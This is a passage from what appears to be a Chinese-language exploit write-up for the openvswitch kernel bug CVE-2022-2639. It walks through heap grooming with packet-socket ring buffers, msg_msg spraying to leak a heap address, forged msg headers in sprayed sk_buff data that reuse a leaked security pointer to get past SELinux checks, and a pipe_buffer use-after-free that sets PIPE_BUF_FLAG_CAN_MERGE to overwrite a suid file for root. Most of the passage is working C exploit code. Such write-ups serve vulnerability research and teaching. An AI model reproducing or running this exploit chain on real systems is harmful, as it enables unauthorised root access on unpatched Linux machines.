__get_free_pages(gfp_flags, order);</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* complete and utter failure */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经常使用的板子（之前自己写的不是很灵活，直接用 <a href="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">veritas501 师傅博客</a> 中的了，此外还收获了其他一些比较有用的轮子😏）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/ethernet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// set parameter &amp; call setsockopt() to alloc RX_RING buffer</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_socket_rx_ring_init</span><span class="params">(<span class="type">int</span> s, <span class="type">unsigned</span> <span class="type">int</span> block_size,</span></span><br><span class="line"><span class="params">                                <span class="type">unsigned</span> <span class="type">int</span> frame_size, <span class="type">unsigned</span> <span class="type">int</span> block_nr,</span></span><br><span class="line"><span class="params">                                <span class="type">unsigned</span> <span class="type">int</span> sizeof_priv, <span class="type">unsigned</span> <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">    <span class="type">int</span> v = TPACKET_V3;</span><br><span class="line">    <span class="type">int</span> rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &amp;v, <span class="keyword">sizeof</span>(v));</span><br><span class="line">    <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">        die(<span class="string">&quot;setsockopt(PACKET_VERSION)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = block_size;</span><br><span class="line">    req.tp_frame_size = frame_size;</span><br><span class="line">    req.tp_block_nr = block_nr;</span><br><span class="line">    req.tp_frame_nr = (block_size * block_nr) / frame_size;</span><br><span class="line">    req.tp_retire_blk_tov = timeout;</span><br><span class="line">    req.tp_sizeof_priv = sizeof_priv;</span><br><span class="line">    req.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;setsockopt(PACKET_RX_RING)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">packet_socket_setup</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> block_size, <span class="type">unsigned</span> <span class="type">int</span> frame_size,</span></span><br><span class="line"><span class="params">                        <span class="type">unsigned</span> <span class="type">int</span> block_nr, <span class="type">unsigned</span> <span class="type">int</span> sizeof_priv, <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">    <span class="type">int</span> s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line">    <span class="keyword">if</span> (s &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;socket(AF_PACKET)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr, sizeof_priv, timeout);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    sa.sll_family = PF_PACKET;</span><br><span class="line">    sa.sll_protocol = htons(ETH_P_ALL);</span><br><span class="line">    sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">    sa.sll_hatype = <span class="number">0</span>;</span><br><span class="line">    sa.sll_pkttype = <span class="number">0</span>;</span><br><span class="line">    sa.sll_halen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> rv = bind(s, (<span class="keyword">struct</span> sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;bind(AF_PACKET)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pagealloc_pad</span><span class="params">(<span class="type">int</span> count, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">    <span class="comment">// packet_socket_setup(size, 4096, count, 0, 100); 效果相同</span></span><br><span class="line">    <span class="keyword">return</span> packet_socket_setup(size, <span class="number">2048</span>, count, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line">fd = pagealloc_pad(<span class="number">1</span>, <span class="number">0x10000</span>) <span class="comment">// 分配一个0x10000的chunk</span></span><br><span class="line">close(fd) <span class="comment">// 释放 chunk</span></span><br><span class="line">    </span><br><span class="line">fd = pagealloc_pad(<span class="number">100</span>, <span class="number">0x1000</span>) <span class="comment">// 分配 100 个 0x1000 的chunk</span></span><br><span class="line">close(fd) <span class="comment">// 一次性释放这个100个chunk</span></span><br></pre></td></tr></table></figure>



<h2 id="exploit-1：泄露-0x400-slab-堆地址"><a href="#exploit-1：泄露-0x400-slab-堆地址" class="headerlink" title="exploit-1：泄露 0x400 slab 堆地址"></a>exploit-1：泄露 0x400 slab 堆地址</h2><p>首先利用上述技术把内核的堆块整理，尽可能的消耗完 freelist 中的空闲 slab。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pagealloc_pad(<span class="number">1000</span>, <span class="number">0x1000</span>);    <span class="comment">// 1000*0x1000</span></span><br><span class="line">pagealloc_pad(<span class="number">500</span>, <span class="number">0x2000</span>);     <span class="comment">// 500*0x2000</span></span><br><span class="line">pagealloc_pad(<span class="number">200</span>, <span class="number">0x4000</span>);     <span class="comment">// 200*0x4000</span></span><br><span class="line">pagealloc_pad(<span class="number">200</span>, <span class="number">0x8000</span>);     <span class="comment">// 200*0x8000</span></span><br><span class="line">pagealloc_pad(<span class="number">100</span>, <span class="number">0x10000</span>);    <span class="comment">// 100*0x10000</span></span><br></pre></td></tr></table></figure>

<p>接着再次申请 0x10000 的 slab，由于此时的堆块均被清理走且不存在 0x10000 的空闲 slab，那么再次申请 0x10000 的 slab 时，就会从 order-5 的 0x20000 的 slab 中申请内存然后分割成两个 order-4 即 0x10000 的 slab。<strong>因此此时分配的 0x10000 的 slab 地址极大概率是相邻的。</strong></p>
<p>接着就是常用的套路，隔一个释放一个，由于只有两个相邻的 order-n slab 都被释放了才会合并成 order-(n+1)，所以此时并不会合并，刚释放的 0x10000 的 slab 则均停留在 freelist 中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> target_fd_cnt (0x20)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> target_fd[target_fd_cnt];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; target_fd_cnt; i++)</span><br><span class="line">    target_fd[i] = pagealloc_pad(<span class="number">1</span>, <span class="number">0x10000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; target_fd_cnt; i+=<span class="number">2</span>) &#123;</span><br><span class="line">    close(target_fd[i]);</span><br><span class="line">    target_fd[i] = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时大概率会形成如下的堆布局：</p>
<p><img src="/img/CVE-2022-2639/2-1.png"></p>
<p>接着 spray <code>struct msg_msg</code>，每个 msg 包含一个 0x1000 的 <code>struct msg_msg</code> 和一个 0x400 的 <code>struct msg_msgseg</code> 。由于第一步已经将 order 小的 slab 都耗尽了，此时分配的 0x1000 的 slab 和 0x400 的 slab 大概率又会从此时处在 freelist 中的 order-4  的 0x10000 的 slab 分割，直到分割到 order-0，分别给这两个消息结构使用。这样的话，之前没释放的 <code>rx_ring buffer</code> 的后面，大概率就会紧挨一个 <code>struct msg_msg</code>，那么此时堆中的布局大概是：</p>
<p><img src="/img/CVE-2022-2639/2-2.png"></p>
<p>然后把刚才在 order-4 中留下的另一半 0x10000 给释放掉，此时又因为先前释放的 0x10000 都被 <code>msg、msgseg</code> 占领或者以其他被切割后的大小存在的 freelist 中，依然不会向上合并。所以此次释放的 0x10000 也都会存在 freelist 中。此时布置能在 0x10000 的 slab 中发生溢出的漏洞对象，从而可以越界覆写到相邻的 <code>struct msg_msg</code> 的 <code>m_ts</code> 字段，这样就可以通过 <code>msg_msg</code> 来越界读泄露 0x400 的辅助消息后面的数据，暂且称该 <code>msg_msg</code> 为 <text style="color:green">msg1</text>，<text style="color:green">msg1</text> 可以通过 <code>msgrcv</code> 的返回值与越界修改的 <code>m_ts</code> 的值是否相等来确定。此时的大概布局：</p>
<p><img src="/img/CVE-2022-2639/2-3.png"></p>
<p>由于在申请 0x400 的 <code>msg_msgseg</code> 时，该 slab 大概率没有为其他任务分配堆块，所以几乎 <code>msg_msgseg</code> 后面都是另一个 <code>msg_msg</code> 的 <code>msg_msgseg</code>，在发送消息也就是创建这些 <code>msg_msg</code> 的时候，我们可以<strong>在消息中对该 <code>msg</code> 进行一个标识，这样就能确定任何一个消息</strong>。可以利用 <text style="color:green">msg1</text> ，通过 <code>msgrcv</code> 接收消息但是设置 <code>MSG_COPY</code> 读取到后面 <code>msg_msgseg</code> 的标识，假设被读取的 <code>msg_msgseg</code> 属于 <text style="color:green">msg2</text>；通过不带 <code>flag</code> 的 <code>msgrcv</code> 来读取 <text style="color:green">msg2</text>，此时就释放了 0x1000 的 <code>msg_msg</code> 和该 0x400 的 <code>msg_msgseg</code> 。<strong>此时再次 spray 多个 0x400 的 <code>msg_msg</code>形成一个 <code>msg</code> 队列，去占用刚刚释放的 msg_msgseg</strong>，队列示意如下：</p>
<p><img src="/img/CVE-2022-2639/2-4.png"></p>
<p>具体 exp 中的做法是保留 <text style="color:green">msg1</text> 的 <code>msqid</code> 在 <code>list1_corrupted_msqid</code> 中，然后通过 <code>msgget</code> 改变其在 <code>msqid[]</code>  中的值，避免 [3-7] 将该 <text style="color:green">msg1</text> 也释放掉；然后判断一下越界读到的内存是不是 <code>msg_msgseg</code>，接着将除 <text style="color:green">msg1</text> 以外的其他消息都释放掉，自然包括了上述的 <text style="color:green">msg2</text>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS_1; i++) &#123;</span><br><span class="line">    <span class="type">ssize_t</span> copy_size = msgrcv(msqid_1[i], msg_a_oob, MSG_TEXT_SIZE(MSG_A_RAW_SIZE + <span class="number">0x400</span>), <span class="number">0</span>, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">    <span class="keyword">if</span> (copy_size &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (copy_size == MSG_TEXT_SIZE(MSG_A_RAW_SIZE + <span class="number">0x400</span>)) &#123; </span><br><span class="line">        logi(<span class="string">&quot;[+] corrupted msg_msg found, id: %d&quot;</span>, msqid_1[i]);</span><br><span class="line">        list1_corrupted_msqid = msqid_1[i];</span><br><span class="line">        msqid_1[i] = msgget(IPC_PRIVATE, IPC_CREAT | <span class="number">0666</span>);</span><br><span class="line">        <span class="type">uint64_t</span> *oob_data = (<span class="type">uint64_t</span> *)(msg_a_oob-&gt;mtext + MSG_A_TEXT_SIZE);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">memcmp</span>(&amp;oob_data[<span class="number">1</span>], <span class="string">&quot;QQQQQQQQ&quot;</span>, <span class="number">8</span>))</span><br><span class="line">            logd(<span class="string">&quot;[-] but the next object is not allocated by msg_msgseg&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (list1_corrupted_msqid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    loge(<span class="string">&quot;[-] can&#x27;t find corrupted msg_msg, and kernel may crash :(&quot;</span>);</span><br><span class="line">    clean_msq1();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">logd(<span class="string">&quot;[3-7] free all uncorrupted msg_msg ...&quot;</span>);</span><br><span class="line">clean_msq1();</span><br><span class="line"></span><br><span class="line">logd(<span class="string">&quot;[3-8] alloc 0x400*16 `msg_msg` chain to re-acquire the 0x400 slab freed by msg_msgseg ...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS_2; i++) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(msg_b-&gt;mtext, <span class="string">&#x27;w&#x27;</span>, MSG_B_TEXT_SIZE);</span><br><span class="line">    ((<span class="type">int</span> *)msg_b-&gt;mtext)[<span class="number">0</span>] = MSG_SIG;</span><br><span class="line">    ((<span class="type">int</span> *)msg_b-&gt;mtext)[<span class="number">1</span>] = i;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x10</span>; j++) &#123;</span><br><span class="line">        msg_b-&gt;mtype = MTYPE_B | (j &lt;&lt; <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid_2[i], msg_b, MSG_B_TEXT_SIZE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            die(<span class="string">&quot;0x400 * 0x10 * NUM_MSQIDS_2 msgsnd() failed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时大概堆布局：</p>
<p><img src="/img/CVE-2022-2639/2-5.png"></p>
<p><code>MTYPE_B | (j &lt;&lt; 8)</code> 的目的是后面为了确定越界读到的 <code>msg_msg</code> 是第一条消息还是后面的消息，来决定读取 <code>m_next</code> 指针还是 <code>m_prev</code> 指针。</p>
<p>触发漏洞越界覆写的数据如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint64_t</span> vuln_buf[] = &#123;</span><br><span class="line">    <span class="number">0</span>,                                     <span class="comment">// m_list.next</span></span><br><span class="line">    <span class="number">0</span>,                                     <span class="comment">// m_list.prev</span></span><br><span class="line">    MTYPE_A,                               <span class="comment">// m_type</span></span><br><span class="line">    MSG_TEXT_SIZE(MSG_A_RAW_SIZE + <span class="number">0x400</span>), <span class="comment">// m_ts</span></span><br><span class="line">&#125;;</span><br><span class="line">trigger_vuln(&amp;vuln_buf, <span class="keyword">sizeof</span>(vuln_buf));</span><br></pre></td></tr></table></figure>

<p><code>m_ts</code> 覆写为多读一个 <code>msg_msgseg</code> 的大小。</p>
<p>假设此时占位成功，那么我们再次利用 <text style="color:green">msg1</text> 越界读取的时候，就会读到 msgB 的 <code>m_next</code> 指针，从而<strong>得到 <text style="color:red">msgC</text> 的地址</strong>：</p>
<p><img src="/img/CVE-2022-2639/2-6.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> copy_size = msgrcv(list1_corrupted_msqid, msg_a_oob, MSG_TEXT_SIZE(MSG_A_RAW_SIZE + <span class="number">0x400</span>), <span class="number">0</span>, MSG_COPY | IPC_NOWAIT);</span><br><span class="line"><span class="keyword">if</span> ((copy_size &lt; <span class="number">0</span>) || (copy_size != MSG_TEXT_SIZE(MSG_A_RAW_SIZE + <span class="number">0x400</span>))) </span><br><span class="line">    die(<span class="string">&quot;[-] recv from corrupted msg_msg failed&quot;</span>);</span><br><span class="line"><span class="type">uint64_t</span> *oob_data = (<span class="type">uint64_t</span> *)(msg_a_oob-&gt;mtext + MSG_A_TEXT_SIZE);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">p</span> =</span> (<span class="keyword">struct</span> msg_msg *)oob_data;</span><br><span class="line"><span class="keyword">if</span> (((<span class="type">int</span> *)&amp;p-&gt;mtext)[<span class="number">0</span>] != MSG_SIG) &#123;</span><br><span class="line">    loge(<span class="string">&quot;[-] bad luck, we don&#x27;t catch 0x400 msg_msg&quot;</span>);</span><br><span class="line">    clean_msq2();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">logd(<span class="string">&quot;[+] it works :)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// list2_leak_msqid —— the msg_msg with kmalloc-0x400 address</span></span><br><span class="line">list2_leak_msqid = msqid_2[((<span class="type">int</span> *)&amp;p-&gt;mtext)[<span class="number">1</span>]];</span><br><span class="line">list2_leak_mtype = p-&gt;m_type;</span><br><span class="line">list2_leak_security = p-&gt;security;</span><br><span class="line"><span class="keyword">if</span> (list2_leak_mtype &gt; <span class="number">0x100</span>) &#123;</span><br><span class="line">    list2_uaf_msg_addr = p-&gt;m_list.prev;</span><br><span class="line">    list2_uaf_mtype = p-&gt;m_type - <span class="number">0x100</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    list2_uaf_msg_addr = p-&gt;m_list.next; <span class="comment">// first msg_msg</span></span><br><span class="line">    list2_uaf_mtype = p-&gt;m_type + <span class="number">0x100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">logd(<span class="string">&quot;[3-10] free all uncorrupted msg_msg ...&quot;</span>);</span><br><span class="line">clean_msq2();</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/2-7.png"></p>
<p>此时得到了一个 0x400 的 slab 的地址。并且由于上述攻击完成后将 <code>msqid1、msqid2</code> 中除了两个用到的 <code>msg_msg</code> 都释放掉了，很多 slab 都会重新回到 freelist 并且部分会发生向上合并的情况。<strong>此时两个还在用到的分别是一个被篡改了 <code>m_ts</code> 的 <text style="color:green">msg1</text> 和有0x10个 <code>msg_msg</code> 消息的队列 <code>list2_leak_msqid</code>，越界直接读的 msgB 和拿到地址的 <text style="color:red">msgC</text> 都属于该队列。</strong></p>
<h2 id="exploit-2：构造-DirtyPipe"><a href="#exploit-2：构造-DirtyPipe" class="headerlink" title="exploit-2：构造 DirtyPipe"></a>exploit-2：构造 DirtyPipe</h2><p>拿到一个正在使用的 <code>msg_msg</code> 堆地址，考虑制造 UAF。前面几步与 exploit-1 的前几步一样，直到触发漏洞时，直接溢出覆写 <code>struct msg_msg</code> 的 <code>m_next</code> 指针为刚才得到正在用的 0x400 的 <code>struct msg_msg</code> 即 <text style="color:red">msgC</text>，暂且称被溢出覆写的<code>struct msg_msg</code>为 msgA，此时的 <code>msg_msg</code> 关系如图：</p>
<p><img src="/img/CVE-2022-2639/2-8.png"></p>
<p>此时两个指针指向同一块内存。uaf 已经呼之欲出了。</p>
<p>接下来先释放掉在 exploit-1 中保留的 <code>list2_leak_msqid</code> ，msgB 和 <text style="color:red">msgC</text> 所在的链并未被破坏，unlink 一切正常，此时 msgA 的 <code>m_next</code> 指向了一块已经释放的内存。<strong>得到了一个 0x400 slab 的 UAF。</strong>此时布局大概如下（B此时也是 freed 的状态了）：</p>
<p><img src="/img/CVE-2022-2639/2-9.png"></p>
<p>然后 spray sk_buff（本文中使用的结构在<a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#">arttnba3 师傅的博客</a>中都有详细说明），大概率会有一个成功占用 <text style="color:red">msgC</text> 的 slab。由于 sk_buff-&gt;data 结构体前面的数据均可控，我们可以伪造一个合法的 msg header ：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(buff, <span class="number">0</span>, <span class="keyword">sizeof</span>(buff));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">p</span> =</span> (<span class="keyword">struct</span> msg_msg *)buff;</span><br><span class="line">p-&gt;m_list.next = list2_uaf_msg_addr;</span><br><span class="line">p-&gt;m_list.prev = list2_uaf_msg_addr;</span><br><span class="line">p-&gt;m_ts = <span class="number">0x100</span>;</span><br><span class="line">p-&gt;m_type = MTYPE_FAKE;</span><br><span class="line">p-&gt;next = <span class="number">0</span>;</span><br><span class="line">p-&gt;security = list2_leak_security; <span class="comment">// bypass selinux</span></span><br><span class="line">spray_skbuff_data(buff, <span class="number">0x400</span> - <span class="number">0x140</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/2-10.png"></p>
<p>此时我们再通过 msgA 所在队列将 sk_buff-&gt;data 所在的 slab 释放，就会得到一个 sk_buff-&gt;data 的 UAF：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">logd(<span class="string">&quot;[4-8] free sk_buff-&gt;data using fake msqid&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS_1; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid_1[i], msg_b, MSG_B_TEXT_SIZE, MTYPE_FAKE, IPC_NOWAIT) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        logd(<span class="string">&quot;[+] freed using msqid %d&quot;</span>, i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/2-11.png"></p>
<p>然后再堆喷 <code>struct pipe_buffer</code>，由于创建一个管道时，在内核中会生成数个连续的 <code>pipe_buffer</code> 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k （0x400）中取出一个 object。此时大概率会<strong>有连续的 <code>pipe buffer</code> 和 sk_buff-&gt;data 共用一个slab</strong>。同时操作pipe，打开目标 suid 文件，并做好 splice 操作：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">logd(<span class="string">&quot;[4-9] spray 0x100 pipe_buffer to re-acquire the 0x400 slab freed by sk_buff-&gt;data&quot;</span>);</span><br><span class="line"><span class="type">int</span> attack_fd = open(ATTACK_FILE, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span> (attack_fd &lt; <span class="number">0</span>) die(<span class="string">&quot;[-] open %s: %m&quot;</span>, ATTACK_FILE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_PIPES; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipes[i])) die(<span class="string">&quot;[-] alloc pipe failed.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    write(pipes[i][<span class="number">1</span>], buff, <span class="number">0x100</span> + i);</span><br><span class="line"></span><br><span class="line">    <span class="type">loff_t</span> offset = <span class="number">1</span>;</span><br><span class="line">    <span class="type">ssize_t</span> nbytes = splice(attack_fd, &amp;offset, pipes[i][<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) die(<span class="string">&quot;[-] splice() failed.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/2-12.png"></p>
<p>此时再<strong>沿着发送的路径接收该包就能将 sk_buff-&gt;data 释放掉，同时泄露了整个 <code>pipe_buffer</code> 结构体</strong>，此时就从 sk_buff-&gt;data 的 UAF 转化为 <code>pipe_buffer</code> 的 UAF：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">logd(<span class="string">&quot;[4-10] free sk_buff-&gt;data to make pipe_buffer become UAF&quot;</span>);</span><br><span class="line"><span class="type">int</span> uaf_pipe_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="type">char</span> pipe_buffer_backup[<span class="number">0x280</span>];</span><br><span class="line"><span class="type">int</span> PIPE_BUF_FLAG_CAN_MERGE = <span class="number">0x10</span>;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">typ_pipe_buffer</span> *<span class="title">ptr</span> =</span> (<span class="keyword">struct</span> typ_pipe_buffer *)buff;</span><br><span class="line">    <span class="type">uint64_t</span> size = <span class="number">0x400</span> - <span class="number">0x140</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sock_pairs[i][<span class="number">1</span>], ptr, size) &lt; <span class="number">0</span>)</span><br><span class="line">                die(<span class="string">&quot;[-] read from sock pairs failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ptr[<span class="number">1</span>].len == <span class="number">1</span> &amp;&amp; ptr[<span class="number">1</span>].offset == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="built_in">memcpy</span>(pipe_buffer_backup, ptr, <span class="keyword">sizeof</span>(pipe_buffer_backup));</span><br><span class="line">                uaf_pipe_idx = ptr[<span class="number">0</span>].len &amp; <span class="number">0xff</span>;</span><br><span class="line">                logi(<span class="string">&quot;[+] uaf_pipe_idx: %d&quot;</span>, uaf_pipe_idx);</span><br><span class="line">                <span class="keyword">goto</span> out1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于在发送的时候 <code>write(pipes[i][1], buff, 0x100 + i)</code>，写在了每个<code>pipe</code>的第一个 <code>pipe_buffer</code>的 page 中，那么第一个<code>pipe_buffer</code> 的 <code>len</code> 即为  0x100 + i，那么 &amp; 0xff 就能得到是哪个 <code>pipe</code> 了。<code>ptr[1].len == 1 &amp;&amp; ptr[1].offset == 1</code> 则是因为前面的 <code>splice()</code> 写在第二个 <code>pipe_buffer</code> 的中，其 page 指向了 page_cache，<code>len</code> 和 <code>offset</code> 都是 <code>splice()</code> 传入的参数指定。</p>
<p><img src="/img/CVE-2022-2639/2-13.png"></p>
<h2 id="exploit-3：权限提升"><a href="#exploit-3：权限提升" class="headerlink" title="exploit-3：权限提升"></a>exploit-3：权限提升</h2><p>到此时为止，<strong>我们拥有一个 <code>pipe_buffer</code> 的 UAF</strong>。不用泄露 <code>ops</code> 字段完成传统的 ROP，直接修改 flags！转化为类似 DirtyPipe 的场景。<strong>自从DirtyPipe被修复后，使用 <code>splice()</code> 时flags会被重新设置为0，而我们的目标就是将这个 flags 再次修改为 <code>PIPE_BUF_FLAG_CAN_MERGE</code>。</strong>从而完成任意文件修改，达到权限提升的目的。这一步还是 spray sk_buff（从头开始就可以 fake 简直不要太好用！），大概率其中一个会占用这个<code>pipe</code> 的 <code>pipe_buffer</code>，修改 flags，len、offset（为了完成从头写）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(buff, <span class="number">0</span>, <span class="keyword">sizeof</span>(buff));</span><br><span class="line"><span class="built_in">memcpy</span>(buff, pipe_buffer_backup, <span class="keyword">sizeof</span>(pipe_buffer_backup));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">typ_pipe_buffer</span> *<span class="title">ptr</span> =</span> (<span class="keyword">struct</span> typ_pipe_buffer *)buff;</span><br><span class="line">ptr[<span class="number">1</span>].flags = PIPE_BUF_FLAG_CAN_MERGE; <span class="comment">// for kernel &gt;= 5.8</span></span><br><span class="line">ptr[<span class="number">1</span>].len = <span class="number">0</span>;</span><br><span class="line">ptr[<span class="number">1</span>].offset = <span class="number">0</span>;                      <span class="comment">// offset = 0</span></span><br><span class="line">ptr[<span class="number">1</span>].ops = ptr[<span class="number">0</span>].ops;                <span class="comment">// for kernel &lt; 5.8</span></span><br><span class="line">spray_skbuff_data(buff, <span class="number">0x400</span> - <span class="number">0x140</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>具体可以参考 <a href="https://github.com/veritas501/pipe-primitive">https://github.com/veritas501/pipe-primitive</a></p>
<p>在 kernel &gt;&#x3D; 5.8 中需要修改 pipe buffer 中 splice 页的flag |&#x3D; PIPE_BUF_FLAG_CAN_MERGE即可（有能力可以顺便把offset和len改成0，这样就能从文件的开头开始写）；在 kernel &lt; 5.8 中，需要先leak一下pipe_buffer中的anon_pipe_ops，然后将 splice 页的的ops改为anon_pipe_ops（因为&lt;5.8版本中能否merge是看ops的）（有能力依然可以顺便把offset和len改成0）。</p>
